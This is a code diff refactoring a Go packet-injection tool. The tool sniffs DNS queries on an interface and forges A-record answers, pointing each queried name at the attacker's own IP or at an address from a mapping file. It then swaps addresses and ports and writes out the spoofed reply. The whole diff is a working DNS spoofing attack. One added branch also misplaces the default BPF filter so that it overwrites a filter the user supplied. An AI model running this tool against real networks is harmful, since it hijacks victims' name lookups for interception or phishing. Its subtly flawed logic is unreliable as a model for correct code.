@@ -39,7 +39,7 @@ func main() {
 		ifs, _ := pcap.FindAllDevs()
 		ifaceName = ifs[0].Name
 	}
-	fmt.Println("Arguments:", ifaceName, hostFile, strings.Join(bpfFilterArr, " "))
+	// fmt.Println("Arguments:", ifaceName, hostFile, strings.Join(bpfFilterArr, " "))
 
 	// opens a device and returns a handle
 	handle, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
@@ -48,6 +48,8 @@ func main() {
 	} else if flag.NArg() != 0 { // set BPFFilter if specified
 		if err := handle.SetBPFFilter(strings.Join(bpfFilterArr, " ")); err != nil {
 			panic(err)
+		} else { // assign default BPFFilter
+			_ = handle.SetBPFFilter("udp port 53")
 		}
 	}
 	defer handle.Close()
@@ -55,84 +57,47 @@ func main() {
 	ip := getIfaceAddr(ifaceName)    // get ip addr relates to the specified interface
 	ipHosts := readMapping(hostFile) // read ip host mapping from file
 
-	// pre-allocate all the space needed for the layers
+	// Create a DecodingLayerParser for decoding
 	var ethLayer layers.Ethernet
 	var ipv4Layer layers.IPv4
 	var udpLayer layers.UDP
 	var dnsLayer layers.DNS
-
-	var q layers.DNSQuestion
-
-	// create the decoder for fast-packet decoding
-	// (using the fast decoder takes about 10% the time of normal decoding)
 	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
-
-	// this slick will hold the names of the layers successfully decoded
 	decodedLayers := make([]gopacket.LayerType, 0, 4)
-
-	// create a buffer for writing output packet
-	outbuf := gopacket.NewSerializeBuffer()
-
-	// set the arguments for serialization
+	buf := gopacket.NewSerializeBuffer()
 	serialOpts := gopacket.SerializeOptions{
 		FixLengths:       true,
 		ComputeChecksums: true,
 	}
-
-	// pre-allocate loop counter
-	var i uint16
 
 	// swap storage for ip and udp fields
 	var ipv4Addr net.IP
 	var udpPort layers.UDPPort
 	var ethMac net.HardwareAddr
 
-	// Main loop for dns packets intercepted
-	// No new allocations after this point to keep garbage collector
-	// cyles at a minimum
+	var i uint16
 	for {
-		packetData, _, err := handle.ReadPacketData()
-		if err != nil {
-			break
-		}
-
-		// decode this packet using the fast decoder
+		packetData, _, _ := handle.ReadPacketData()
 		err = decoder.DecodeLayers(packetData, &decodedLayers)
-
-		// only proceed if all layers decoded
-		if len(decodedLayers) != 4 {
-			// fmt.Println("Not enough layers!")
+		if len(decodedLayers) != 4 || dnsLayer.QR { // if QR = 1, means its a DNS response packet
 			continue
 		}
 
-		// check that this is not a response
-		if dnsLayer.QR {
-			continue
-		}
-
-		// print the question section
 		fmt.Println("========== Packet captured! ==========")
-		fmt.Println("DNS questions:")
+		fmt.Printf("DNS questions: total %v\n", dnsLayer.QDCount)
 		for i = 0; i < dnsLayer.QDCount; i++ {
-			fmt.Println(i, string(dnsLayer.Questions[i].Name))
+			fmt.Printf("[%v]: %v", i, string(dnsLayer.Questions[i].Name))
 		}
 
-		// set this to be a response
-		dnsLayer.QR = true
-
-		// if recursion was requested, it is available
-		if dnsLayer.RD {
-			dnsLayer.RA = true
+		dnsLayer.QR = true // QR: true indicates a response packet
+		if dnsLayer.RD {   // RD(Recursion Desired): is set in a query and is copied into the response.
+			dnsLayer.RA = true // RA(Recursion Available): indicates recursive query is available in the name server.
 		}
 
 		forge := false
-		// for each question
-		for i = 0; i < dnsLayer.QDCount; i++ {
-
-			// get the question
+		var q layers.DNSQuestion
+		for i = 0; i < dnsLayer.QDCount; i++ { // iterate through questions
 			q = dnsLayer.Questions[i]
-
-			// verify this is an A-IN record question
 			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
 				continue
 			}
@@ -141,109 +106,56 @@ func main() {
 			a.Type = layers.DNSTypeA
 			a.Class = layers.DNSClassIN
 			a.TTL = 300
-
-			// copy the name across to the response
 			a.Name = q.Name
-			fmt.Println("name of question:", string(q.Name))
 			// assign related ip addr
-			if ipHosts == nil {
-				fmt.Println("set ip as interface's ip addr")
+			if ipHosts == nil { // mapping file is not specified, use ip addr of interface
 				forge = true
-				a.IP = ip // mapping file not specified, forge replies with the chosen interface's IP address
-			} else if ipStr, ok := ipHosts[string(q.Name)]; ok {
-				fmt.Println("host exists in mapping file")
+				a.IP = ip
+			} else if ipStr, ok := ipHosts[string(q.Name)]; ok { // use ip addr in mapping file
 				forge = true
 				a.IP = net.ParseIP(ipStr)
-			} else {
-				continue // not in mapping, ignore
+			} else { // ip addr is not provided in mapping file, ignore
+				continue
 			}
-
-			// append the answer to the original query packet
+			fmt.Printf("forged: type %v, [%v] -> [%v]", a.Type, string(q.Name), a.IP)
 			dnsLayer.Answers = append(dnsLayer.Answers, a)
 			dnsLayer.ANCount = dnsLayer.ANCount + 1
-
+			fmt.Printf("DNS answer total: %v\n", dnsLayer.ANCount)
 		}
-		// file is specified while host is not contained in file, no need to forge response
+
 		if forge == false {
 			fmt.Println("no need to forge response")
 			continue
 		}
 
-		// swap ethernet macs
+		// swap src/dst mac
 		ethMac = ethLayer.SrcMAC
 		ethLayer.SrcMAC = ethLayer.DstMAC
 		ethLayer.DstMAC = ethMac
-
-		// swap the ip
+		// swap src/dst ip
 		ipv4Addr = ipv4Layer.SrcIP
 		ipv4Layer.SrcIP = ipv4Layer.DstIP
 		ipv4Layer.DstIP = ipv4Addr
-
-		// swap the udp ports
+		fmt.Printf("IP: src %v, dst %v\n", ipv4Layer.SrcIP, ipv4Layer.DstIP)
+		// swap src/dst udp ports
 		udpPort = udpLayer.SrcPort
 		udpLayer.SrcPort = udpLayer.DstPort
 		udpLayer.DstPort = udpPort
-
-		// set the UDP to be checksummed by the IP layer
-		err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
-		if err != nil {
-			panic(err)
-		}
+		fmt.Printf("UDP port: src %v, dst %v\n", udpLayer.SrcPort, udpLayer.DstPort)
 
 		// serialize packets
-		err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
-		if err != nil {
-			panic(err)
-		}
+		_ = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
+		_ = gopacket.SerializeLayers(buf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
 
 		// write packet
-		err = handle.WritePacketData(outbuf.Bytes())
+		err = handle.WritePacketData(buf.Bytes())
 		if err != nil {
 			panic(err)
 		}
 
 		fmt.Println("Response sent")
 
-		// comment out for debugging
-		// continue
-
-		// DEBUGGG--------------------------------------------------------------
-
-		err = decoder.DecodeLayers(outbuf.Bytes(), &decodedLayers)
-		if err != nil {
-			fmt.Println("Decoding error: " + err.Error())
-			continue
-		}
-
-		// only proceed if all layers decoded
-		if len(decodedLayers) != 4 {
-			fmt.Println("Not enough layers!")
-			for j := range decodedLayers {
-				fmt.Println(decodedLayers[j])
-			}
-			continue
-		}
-
-		// print packet
-		fmt.Printf("IP src %v\n", ipv4Layer.SrcIP)
-		fmt.Printf("IP dst %v\n", ipv4Layer.DstIP)
-		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
-		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
-		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
-		// print the question section
-		for i = 0; i < dnsLayer.QDCount; i++ {
-			fmt.Printf("%v\n", string(dnsLayer.Questions[i].Name))
-		}
-		fmt.Printf("DNS Ans count: %v\n", dnsLayer.ANCount)
-
-		// print the question section
-		for i = 0; i < dnsLayer.ANCount; i++ {
-			fmt.Printf("%v type %v\n", string(dnsLayer.Answers[i].Name), dnsLayer.Answers[i].Type)
-			fmt.Printf("\t%v\n", dnsLayer.Answers[i].IP)
-		}
-
-		break
-
+		continue
 	}
 
 }
